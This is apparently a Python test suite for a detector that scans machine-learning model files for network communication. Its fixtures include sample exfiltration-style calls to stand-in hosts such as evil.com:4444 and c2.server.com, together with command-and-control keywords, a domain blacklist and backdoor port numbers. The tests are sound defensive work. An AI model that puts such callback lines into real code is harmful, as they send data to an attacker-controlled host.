"""Tests for network communication detection."""

import os
from pathlib import Path
from urllib.parse import urlparse

from modelaudit.detectors.network_comm import NetworkCommDetector, detect_network_communication


def _is_ci_environment() -> bool:
    """Check CI/GitHub Actions env vars to determine whether tests run in CI."""
    return bool(os.getenv("CI") or os.getenv("GITHUB_ACTIONS"))


class TestNetworkCommDetector:
    """Test the NetworkCommDetector class."""

    def test_detect_urls(self) -> None:
        """Test detection of URLs in binary data."""
        detector = NetworkCommDetector()

        # Test HTTP and HTTPS URLs
        data = b"""
        Some model data
        http://example.com/download
        https://malware.net/payload
        ftp://badserver.com/upload
        """

        findings = detector.scan(data, "test_model.pkl")

        # Should find at least 3 URLs
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        assert len(url_findings) >= 3

        # Check specific URLs are detected
        urls = [f["url"] for f in url_findings]
        assert any(urlparse(url).hostname == "example.com" for url in urls)
        assert any(urlparse(url).hostname == "malware.net" for url in urls)

    def test_detect_urls_redacts_credentials_and_query(self) -> None:
        """URL findings should not preserve credentialed or signed URL secrets."""
        detector = NetworkCommDetector()
        data = (
            b"https://user:pass@example.com/model.bin?"
            b"X-Amz-Signature=SECRET_SIGNATURE&token=SECRET_TOKEN#SECRET_FRAGMENT"
        )

        findings = detector.scan(data, "model.bin")
        url_finding = next(f for f in findings if f["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/model.bin"
        assert "example.com/model.bin" in url_finding["message"]
        serialized = f"{url_finding['url']} {url_finding['message']}"
        assert "user:pass" not in serialized
        assert "SECRET_SIGNATURE" not in serialized
        assert "SECRET_TOKEN" not in serialized
        assert "SECRET_FRAGMENT" not in serialized

    def test_detect_urls_preserves_port_zero_and_rejects_hostless_netloc(self) -> None:
        """URL redaction should preserve explicit port 0 and avoid hostless netloc output."""
        detector = NetworkCommDetector()
        data = b"https://example.com:0/model.bin?token=SECRET https://@/missing-host"

        findings = detector.scan(data, "model.bin")
        url_findings = [finding for finding in findings if finding["type"] == "url_detected"]
        urls = [finding["url"] for finding in url_findings]

        assert "https://example.com:0/model.bin" in urls
        assert "[invalid-url]" in urls
        serialized = " ".join(f"{finding['url']} {finding['message']}" for finding in url_findings)
        assert "token=SECRET" not in serialized
        assert "https:///missing-host" not in serialized

    def test_cloud_storage_urls_redact_signed_query(self) -> None:
        """Cloud storage findings should redact signed URL query material."""
        detector = NetworkCommDetector()
        data = b"s3://model-bucket/path/model.bin?X-Amz-Credential=SECRET_CREDENTIAL&X-Amz-Signature=SECRET_SIGNATURE"

        findings = detector.scan(data, "model.bin")
        cloud_finding = next(f for f in findings if f["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == "s3://model-bucket/path/model.bin"
        assert "model-bucket/path/model.bin" in cloud_finding["message"]
        serialized = f"{cloud_finding['url']} {cloud_finding['message']}"
        assert "SECRET_CREDENTIAL" not in serialized
        assert "SECRET_SIGNATURE" not in serialized
        assert cloud_finding["provider"] == "s3"

    def test_detect_ipv4_addresses(self) -> None:
        """Test detection of IPv4 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        192.168.1.1
        10.0.0.1
        8.8.8.8
        172.16.0.1
        """

        findings = detector.scan(data)
        ipv4_findings = [f for f in findings if f["type"] == "ipv4_address"]

        assert len(ipv4_findings) == 4

        # Check private vs public classification
        private_ips = [f for f in ipv4_findings if f.get("is_private")]
        public_ips = [f for f in ipv4_findings if f.get("is_global")]

        assert len(private_ips) == 3  # 192.168, 10.0, 172.16
        assert len(public_ips) == 1  # 8.8.8.8

    def test_detect_ipv6_addresses(self) -> None:
        """Test detection of IPv6 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        2001:0db8:85a3:0000:0000:8a2e:0370:7334
        fe80:0000:0000:0000:0202:b3ff:fe1e:8329
        """

        findings = detector.scan(data)
        ipv6_findings = [f for f in findings if f["type"] == "ipv6_address"]

        assert len(ipv6_findings) == 2

    def test_detect_domain_names(self) -> None:
        """Test detection of domain names."""
        detector = NetworkCommDetector()

        data = b"""
        connect to api.example.com
        download from cdn.badsite.tk
        upload to data-exfil.ml
        """

        findings = detector.scan(data)
        domain_findings = [f for f in findings if f["type"] == "domain_name"]

        assert len(domain_findings) >= 2  # Should detect suspicious TLDs

        # Check suspicious TLD detection
        suspicious = [f for f in domain_findings if f["confidence"] > 0.6]
        assert len(suspicious) >= 2  # .tk and .ml are suspicious

    def test_detect_network_libraries(self) -> None:
        """Test detection of network library imports."""
        detector = NetworkCommDetector()

        data = b"""
        import socket
        from urllib import request
        import requests
        from paramiko import SSHClient
        """

        findings = detector.scan(data)
        lib_findings = [f for f in findings if f["type"] == "network_library"]

        assert len(lib_findings) >= 4

        # Check specific libraries
        libs = [f["library"] for f in lib_findings]
        assert "socket" in libs
        assert "urllib" in libs
        assert "requests" in libs
        assert "paramiko" in libs

        # Check severity levels
        critical = [f for f in lib_findings if f["severity"] == "CRITICAL"]
        assert len(critical) >= 2  # socket and paramiko are critical

    def test_detect_network_functions(self) -> None:
        """Test detection of network function calls."""
        detector = NetworkCommDetector()

        data = b"""
        socket.connect(('evil.com', 4444))
        requests.post('http://c2.server.com/data', payload)
        urlopen('https://exfiltrate.net')
        ftp.connect('upload.server.com')
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) >= 4

        # Check specific functions
        funcs = [f["function"] for f in func_findings]
        assert "socket.connect" in funcs
        assert "requests.post" in funcs
        assert "urlopen" in funcs

    def test_network_functions_not_flagged_in_documentation_metadata_context(self) -> None:
        """Documentation prose should not report raw network library/function token mentions."""
        detector = NetworkCommDetector()
        data = b"This README says: import socket, requests.get, and urlopen are shown for examples."

        findings = detector.scan(data, "model_card.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_network_function_with_parentheses_still_flagged_in_metadata_context(self) -> None:
        """Executable-looking calls should stay detectable even when embedded in metadata files."""
        detector = NetworkCommDetector()
        data = b'socket.connect(("api.example", 4444))'

        findings = detector.scan(data, "metadata.json")

        func_findings = [finding for finding in findings if finding["type"] == "network_function"]
        assert any(finding["function"] == "socket.connect" for finding in func_findings)

    def test_network_function_after_doc_token_still_flagged(self) -> None:
        """A prose token mention should not hide a later executable-looking function call."""
        detector = NetworkCommDetector()
        data = b'This README says requests.get is shown for examples.\nrequests.get("https://evil.example")'

        findings = detector.scan(data, "metadata.json")

        func_findings = [finding for finding in findings if finding["type"] == "network_function"]
        assert any(finding["function"] == "requests.get" for finding in func_findings)

    def test_network_library_with_realistic_prose_context_not_flagged(self) -> None:
        """Import-like words in prose should not be treated as network imports."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes import socket for demos and troubleshooting examples."

        findings = detector.scan(data, "README.txt")

        assert not [finding for finding in findings if finding["type"] == "network_library"]

    def test_executable_metadata_named_path_still_flags_network_import(self) -> None:
        """Executable paths containing metadata-like words should not be treated as prose."""
        detector = NetworkCommDetector()
        data = b"import socket  # used by this metadata helper to open outbound connections"

        findings = detector.scan(data, "src/metadata_utils.py")

        assert any(finding["type"] == "network_library" for finding in findings)

    def test_metadata_context_without_prose_marker_still_flags_network_import(self) -> None:
        """Metadata filenames alone should not suppress executable-looking imports."""
        detector = NetworkCommDetector()
        data = b'{"hook": "import socket then send payload"}'

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_metadata_context_with_marker_in_structured_hook_still_flags_network_import(self) -> None:
        """Marker words in structured metadata should not hide executable import text."""
        detector = NetworkCommDetector()
        data = b'{"hook": "import socket includes callback"}'

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_inline_comment_prose_marker_after_code_still_flags_network_import(self) -> None:
        """Inline prose markers should not hide executable import statements."""
        detector = NetworkCommDetector()
        data = b"if True: import socket  # for outbound callback"

        findings = detector.scan(data, "model.pkl")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_inline_compound_statement_with_prose_marker_still_flags_network_import(self) -> None:
        """Compound statements should stay executable even when comments look prose-like."""
        detector = NetworkCommDetector()
        data = b"for _ in [0]: import socket  # examples"

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_newline_free_binary_prose_marker_does_not_hide_later_import(self) -> None:
        """A prose marker far away in a binary blob should not suppress a later import token."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes examples " + (b"x" * 600) + b"import socket"

        findings = detector.scan(data, "model.pkl")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_network_library_after_doc_import_still_flagged(self) -> None:
        """A prose import mention should not hide a later executable import."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes import socket for demos and troubleshooting examples.\nimport socket"

        findings = detector.scan(data, "README.txt")

        lib_findings = [finding for finding in findings if finding["type"] == "network_library"]
        assert any(finding["library"] == "socket" for finding in lib_findings)

    def test_detect_cc_patterns(self) -> None:
        """Test detection of command & control patterns."""
        detector = NetworkCommDetector()

        data = b"""
        beacon_url = "http://c2.server.com"
        callback_url = config['server']
        malware_config = {"backdoor": True}
        botnet_id = "zombie123"
        """

        findings = detector.scan(data)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]

        assert len(cc_findings) >= 4

        # All C&C patterns should be critical
        assert all(f["severity"] == "CRITICAL" for f in cc_findings)

        # Check specific patterns
        patterns = [f["pattern"] for f in cc_findings]
        assert "beacon_url" in patterns
        assert "malware" in patterns
        assert "backdoor" in patterns
        assert "botnet" in patterns

    def test_benign_metadata_reference_keys_are_not_cc_patterns(self) -> None:
        """Common model metadata URL keys are not C&C indicators by themselves."""
        detector = NetworkCommDetector()

        data = b"""
        {
            "download_url": "https://huggingface.co/example/model",
            "report_url": "https://huggingface.co/example/model/blob/main/README.md",
            "telemetry_endpoint": "disabled",
            "heartbeat_interval": 30,
            "keepalive": true,
            "update_server": "none",
            "upload_endpoint": "none"
        }
        """

        findings = detector.scan(data)
        cc_patterns = {f["pattern"] for f in findings if f["type"] == "cc_pattern"}

        assert cc_patterns.isdisjoint(
            {
                "download_url",
                "report_url",
                "telemetry_endpoint",
                "heartbeat",
                "keepalive",
                "update_server",
                "upload_endpoint",
            }
        )

    def test_detect_suspicious_ports(self) -> None:
        """Test detection of suspicious port numbers."""
        detector = NetworkCommDetector()

        data = b"""
        connect to server:1337
        ssh port=22
        PORT=4444
        redis:6379
        """

        findings = detector.scan(data)
        port_findings = [f for f in findings if f["type"] == "suspicious_port"]

        assert len(port_findings) >= 4

        # Check specific ports
        ports = [f["port"] for f in port_findings]
        assert 1337 in ports  # Common backdoor
        assert 22 in ports  # SSH
        assert 4444 in ports  # Metasploit
        assert 6379 in ports  # Redis

    def test_suspicious_port_scan_performance(self) -> None:
        """Ensure port scanning remains performant with precompiled patterns."""
        detector = NetworkCommDetector()
        data = b"connect to server:1337" * 100
        context = "model.bin"

        import time

        start = time.perf_counter()
        # Fewer iterations in CI environments
        iterations = 20 if _is_ci_environment() else 50
        for _ in range(iterations):
            detector.findings = []
            detector._scan_suspicious_ports(data, context)
        duration = time.perf_counter() - start

        assert duration < 1.0

    def test_blacklist_detection(self) -> None:
        """Test detection of blacklisted domains when configured."""
        # Configure with specific blacklisted domains
        config = {"custom_blacklist": [b"malicious-site.com", b"known-c2.net", b"phishing-domain.org"]}
        detector = NetworkCommDetector(config)

        data = b"""
        http://malicious-site.com/payload
        connect to known-c2.net
        upload to phishing-domain.org
        """

        findings = detector.scan(data)
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]

        assert len(blacklist_findings) >= 3

        # Blacklisted domains should have max confidence
        assert all(f["confidence"] == 1.0 for f in blacklist_findings)
        assert all(f["severity"] == "CRITICAL" for f in blacklist_findings)

    def test_custom_config(self) -> None:
        """Test custom configuration options."""
        config = {
            "custom_cc_patterns": [b"custom_beacon", b"my_backdoor"],
            "custom_blacklist": [b"custom-evil.com", b"my-c2.net"],
        }
        detector = NetworkCommDetector(config)

        data = b"""
        custom_beacon = "http://server.com"
        my_backdoor.connect()
        http://custom-evil.com
        connect to my-c2.net
        """

        findings = detector.scan(data)

        # Check custom C&C patterns
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        patterns = [f["pattern"] for f in cc_findings]
        assert "custom_beacon" in patterns
        assert "my_backdoor" in patterns

        # Check custom blacklist
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]
        domains = [f["domain"] for f in blacklist_findings]
        assert any(domain == "custom-evil.com" for domain in domains)
        assert any(domain == "my-c2.net" for domain in domains)

    def test_custom_patterns_isolated_between_instances(self) -> None:
        """Ensure custom patterns and blacklists do not leak between instances."""
        config = {
            "custom_cc_patterns": ["LEAK_PATTERN"],
            "custom_blacklist": ["LEAK.example"],
        }
        detector_with_custom = NetworkCommDetector(config)
        detector_default = NetworkCommDetector()

        data = b"LEAK_PATTERN http://LEAK.example"

        findings_custom = detector_with_custom.scan(data)
        assert any(f["type"] == "cc_pattern" and f["pattern"] == "leak_pattern" for f in findings_custom)
        assert any(f["type"] == "blacklisted_domain" and f["domain"] == "leak.example" for f in findings_custom)

        findings_default = detector_default.scan(data)
        assert all(f["type"] != "cc_pattern" for f in findings_default)
        assert all(f["type"] != "blacklisted_domain" for f in findings_default)

    def test_confidence_scoring(self) -> None:
        """Test confidence scoring for different patterns."""
        detector = NetworkCommDetector()

        data = b"""
        http://normal-site.com
        http://evil-site.tk:1337/cmd
        192.168.1.1
        8.8.8.8
        malware_config = {}
        import json
        import socket
        """

        findings = detector.scan(data)

        # URL with suspicious port should have higher confidence
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        suspicious_urls = [f for f in url_findings if ":1337" in f["url"]]
        assert all(f["confidence"] >= 0.8 for f in suspicious_urls)

        # Private IPs should have lower confidence than public
        ip_findings = [f for f in findings if "ipv4" in f["type"]]
        private_ips = [f for f in ip_findings if f.get("is_private")]
        public_ips = [f for f in ip_findings if f.get("is_global")]

        if private_ips and public_ips:
            assert max(f["confidence"] for f in private_ips) < max(f["confidence"] for f in public_ips)

        # Malware patterns should have high confidence
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        malware_findings = [f for f in cc_findings if "malware" in f["pattern"]]
        assert all(f["confidence"] >= 0.95 for f in malware_findings)

    def test_no_false_positives_on_clean_data(self) -> None:
        """Test that clean model data doesn't trigger false positives."""
        detector = NetworkCommDetector()

        # Clean model data with some numbers that could look like IPs
        data = b"""
        model_weights = [1.2, 3.4, 5.6, 7.8]
        layer_sizes = [224, 224, 3]
        version = "2.0.1.1"
        optimizer = "adam"
        loss = 0.001
        """

        findings = detector.scan(data)

        # Should not detect version numbers as IPs
        ip_findings = [f for f in findings if "ip" in f["type"]]
        assert len(ip_findings) == 0

        # Should not detect any network patterns
        assert len(findings) == 0

    def test_context_extraction(self) -> None:
        """Test that context/snippets are properly extracted."""
        detector = NetworkCommDetector()

        data = b"""
        This is some context before
        socket.connect(('evil.com', 4444))
        and some context after
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) > 0

        # Check that snippet contains surrounding context
        snippet = func_findings[0].get("snippet", "")
        assert "context before" in snippet or "context after" in snippet


class TestDetectNetworkCommunication:
    """Test the convenience function."""

    def test_scan_file(self, tmp_path: Path) -> None:
        """Test scanning a file for network patterns."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"http://malicious.com/payload")

        findings = detect_network_communication(str(test_file))
        assert len(findings) > 0
        assert any(urlparse(f.get("url", "")).hostname == "malicious.com" for f in findings)

    def test_file_not_found(self) -> None:
        """Test handling of non-existent files."""
        findings = detect_network_communication("/non/existent/file.pkl")
        assert len(findings) == 1
        assert findings[0]["type"] == "error"
        assert "not found" in findings[0]["message"]

    def test_with_config(self, tmp_path: Path) -> None:
        """Test scanning with custom configuration."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"my_custom_pattern")

        config = {"custom_cc_patterns": [b"my_custom_pattern"]}

        findings = detect_network_communication(str(test_file), config)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        assert len(cc_findings) == 1
        assert cc_findings[0]["pattern"] == "my_custom_pattern"
